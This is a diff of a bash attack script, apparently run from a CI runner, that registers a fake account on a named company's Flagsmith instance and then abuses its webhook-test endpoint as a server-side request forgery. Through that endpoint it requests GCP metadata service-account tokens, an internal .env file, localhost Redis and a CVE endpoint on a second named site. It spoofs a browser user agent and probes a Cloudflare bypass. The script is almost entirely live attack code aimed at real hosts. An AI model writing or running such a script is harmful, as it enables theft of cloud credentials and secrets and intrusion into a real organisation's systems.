@@ -1,58 +1,73 @@
 #!/bin/bash
-echo "=== GitHub Actions Runner ==="
+set -e
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 echo "IP: $(curl -s https://ifconfig.me)"
 
-# Step 1: Register FRESH account (no prior rate limit on token)
-echo "=== REGISTER ==="
+# Register
 ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
   -H "Content-Type: application/json" \
-  -d '{"email":"ghactions-kw@proton.me","password":"GhActions2026!","first_name":"GH","last_name":"Runner"}' \
+  -H "User-Agent: $UA" \
+  -H "Accept: application/json" \
+  -d '{"email":"ghactions-kw2@proton.me","password":"GhActions2026!2","first_name":"GH","last_name":"R"}' \
   --max-time 15)
-echo "Register: $ACCT"
-
+echo "Reg: $ACCT"
 KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
-echo "KEY: $KEY"
+[ -z "$KEY" ] && echo "FAILED: No key" && exit 1
 
-if [ -n "$KEY" ]; then
-  # Step 2: Create org
-  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -d '{"name":"gh"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  echo "Org: $OID"
-  
-  # Step 3: Create project
-  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -d "{\"name\":\"g\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  echo "Proj: $PID"
-  
-  # Step 4: Create env
-  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -d "{\"name\":\"g\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
-  echo "Env: $EKEY"
-  
-  # Step 5: Fire GCP metadata test
-  echo "=== GCP METADATA v1beta1 ==="
+# Org
+OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
+  -H "User-Agent: $UA" -H "Accept: application/json" \
+  -d '{"name":"gh2"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+echo "Org: $OID"
+
+# Project
+PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
+  -H "User-Agent: $UA" -H "Accept: application/json" \
+  -d "{\"name\":\"g2\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+echo "Proj: $PID"
+
+# Env
+EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
+  -H "User-Agent: $UA" -H "Accept: application/json" \
+  -d "{\"name\":\"g2\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
+echo "Env: $EKEY"
+
+SSRF() {
   curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -d '{"url":"http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"}' \
-    --max-time 20
-  echo ""
-  
-  # Step 6: Fire CVE exploit
-  echo "=== CVE-2026-10795 EXPLOIT ==="
-  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -d '{"url":"https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=test_payload"}' \
-    --max-time 20
-  echo ""
-  
-  # Step 7: Test koinp2p.com reachability
-  echo "=== KOINP2P REACHABILITY ==="
-  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -d '{"url":"https://koinp2p.com/"}' \
-    --max-time 20
-  echo ""
-fi
+    -H "User-Agent: $UA" -H "Accept: application/json" \
+    -d "{\"url\":\"$1\"}" --max-time 20
+}
+
+# Test 1: koinp2p homepage (CF bypass test)
+echo "=== KOINP2P ==="
+SSRF "https://koinp2p.com/"
+echo ""
+
+# Test 2: magellan .env (internal access)
+echo "=== MAGELLAN .ENV ==="
+SSRF "https://magellan.koinworks.com/.env"
+echo ""
+
+# Test 3: GCP metadata v1beta1 
+echo "=== GCP METADATA ==="
+SSRF "http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"
+echo ""
+
+# Test 4: GCP metadata v1 (without header - some configs allow)
+echo "=== GCP METADATA V1 ==="
+SSRF "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+echo ""
+
+# Test 5: localhost Redis
+echo "=== REDIS ==="
+SSRF "http://127.0.0.1:6379/"
+echo ""
+
+# Test 6: CVE exploit on koinp2p
+echo "=== CVE EXPLOIT ==="
+SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=test"
+echo ""
